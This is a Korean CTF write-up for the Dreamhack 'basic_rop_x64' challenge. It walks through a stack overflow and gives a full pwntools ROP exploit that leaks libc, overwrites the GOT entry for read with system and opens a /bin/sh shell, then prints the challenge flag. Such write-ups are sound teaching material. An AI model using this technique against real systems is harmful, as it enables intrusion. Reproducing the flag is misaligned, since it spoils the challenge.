<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" type="text/css" href="style.css">
</head>
<body>
    <h1> Dreamhack "basic_rop_x64"  Write-UP</h1>
</body>
<br>
<br>
</html>

2025.09.29 풀이

<img width="1280" height="88" alt="image" src="https://github.com/user-attachments/assets/ec97f0c7-7789-4e95-9cfd-fbb8818c58ec" />

제공받은 elf를 checksec로 확인해보았다. 보니, NX가 적용된 것을 알 수 있다.

<br>

</br> 

<img width="634" height="912" alt="image" src="https://github.com/user-attachments/assets/742aa00f-544f-4703-8aec-6de1255b1573" />

문제 코드를 살펴보니, initialize()로 stdio 버퍼링을 차단한 것을 알 수 있다.

그리고 read가 0x40 크기의 buf에 0x400 바이트를 받아와서 오버플로우를 유발하는 것을

알 수 있다. 그 후, wirte 함수는 버퍼의 앞 0x40 바이트만 출력하는 것을 보아하니,

오버플로우를 유발하여 리턴주소를 덮어쓰고 ROP를 이용하는 식으로 익스플로잇 코드를

작성하면 될 것으로 보인다.

<br>

</br> 

<img width="662" height="832" alt="image" src="https://github.com/user-attachments/assets/a7124f5c-4507-466e-aa74-1bd5a66b0427" />

main 함수를 어셈블리해보니, rbp-0x40 를 통해 buf가 0x40 크기인 것을 알 수 있다.

<br>

</br> 

<img width="1138" height="118" alt="image" src="https://github.com/user-attachments/assets/4d89098c-3eed-4dff-9a28-2918ddeaeef3" />

<img width="1012" height="852" alt="image" src="https://github.com/user-attachments/assets/65702dd2-dff7-45a8-909f-44952e1258ff" />

익스플로잇 코드를 작성할 때 이용하기 위해, 가젯 주소를 알아내보았다,

pop rdi 가젯 주소는 0x400883, pop rsi 가젯 주소는 0x400881, ret 가젯 주소는 0x4005a9이다.

<br>

</br> 

```
import os
from pwn import *

context.log_level = 'debug'
context(arch='amd64', os='linux')

p = remote('host8.dreamhack.games', 8935)
e = ELF('./basic_rop_x64')
libc = ELF('./libc.so.6')

read_plt = e.plt['read']
read_got = e.got['read']
write_plt = e.plt['write']
write_got = e.got['write']

pop_rdi = 0x400883
pop_rsi_r15 = 0x400881
ret = 0x4005a9

payload = b'A' * 0x48   # buf + SFP

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi_r15)
payload += p64(read_got)
payload += p64(0)
payload += p64(write_plt)

payload += p64(pop_rdi)
payload += p64(0)
payload += p64(pop_rsi_r15)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

payload += p64(pop_rdi)
payload += p64(read_got + 0x8)
payload += p64(ret)
payload += p64(read_plt)


p.send(payload)

p.recvuntil(b'A' * 0x40)
read_addr = u64(p.recvn(8))
libc_base = read_addr - libc.symbols['read']
log.info(f'read : {hex(read_addr)}')
log.info(f'libc_base : {hex(libc_base)}')

system = libc_base + libc.symbols['system']
log.info(f'system : {hex(system)}')

p.send(p64(system) + b'/bin/sh\x00')

p.interactive()
```
위처럼 익스플로잇 코드를 작성해보았다. ROP를 통해 libc의 read 주소를

알아내 libc 베이스와 system 주소를 계산한 후, GOT의 read 엔트리에 system 주소와 /bin/sh\x00 작성하여,

/bin/sh를 실행하는 코드이다.

<br>

</br> 

<img width="1280" height="755" alt="image" src="https://github.com/user-attachments/assets/5ef77b22-c3a8-4fc5-b8ce-6ba5937b409b" />

해당 코드를 실행해보니, 플래그 값을 얻을 수 있었다, 

<br>

</br> 

```
DH{6311151d71a102eb27195bceb61097c15cd2bcd9fd117fc66293e8c780ae104e}
```
